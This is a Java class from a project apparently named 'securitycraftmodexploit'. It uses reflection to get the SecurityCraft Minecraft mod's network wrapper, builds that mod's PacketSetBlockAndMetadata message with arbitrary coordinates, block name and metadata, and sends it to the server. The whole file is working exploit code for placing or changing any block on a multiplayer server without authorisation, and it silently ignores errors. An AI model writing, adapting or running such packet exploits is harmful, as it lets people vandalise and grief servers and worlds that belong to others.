package fr.kaitomomota.securitycraftmodexploit.securitycraft.packets;

import java.lang.reflect.Constructor;
import java.lang.reflect.Field;

import cpw.mods.fml.common.network.simpleimpl.IMessage;
import cpw.mods.fml.common.network.simpleimpl.SimpleNetworkWrapper;
import fr.kaitomomota.securitycraftmodexploit.securitycraft.SecurityCraftController;

public class PacketSender {
	
	private SecurityCraftController controller;
	private static final String EXPLOIT_PACKET = "net.geforcemods.securitycraft.network.packets.PacketSetBlockAndMetadata";
	
	public PacketSender(SecurityCraftController controller) {
		this.controller = controller;
	}
	
	public void sendExploitPacket(int x, int y, int z, String blockName, int meta) {
		Class<?> mainClass = controller.getMainClass();
		
		try {
			
			// Getting the NetworkWrapper of SecurityCraft using reflection:
			
			Field networkField = mainClass.getField("network");
			networkField.setAccessible(true);
			SimpleNetworkWrapper wrapper = (SimpleNetworkWrapper) networkField.get(null);
			
			// Getting the exploit packet via reflection:
			
			Class<?> exploitPacketClass = Class.forName(EXPLOIT_PACKET);
			Constructor<?> cons = exploitPacketClass.getConstructor(int.class, int.class, int.class, String.class, int.class);
			IMessage packetExploit = (IMessage) cons.newInstance(x, y, z, blockName, meta);
			
			// Sending the packet:
			
			wrapper.sendToServer(packetExploit);
			
		} catch (ReflectiveOperationException ignore) {} // we are going to use lot of operation that throws exception that extends ReflectiveOperationException
	}

}
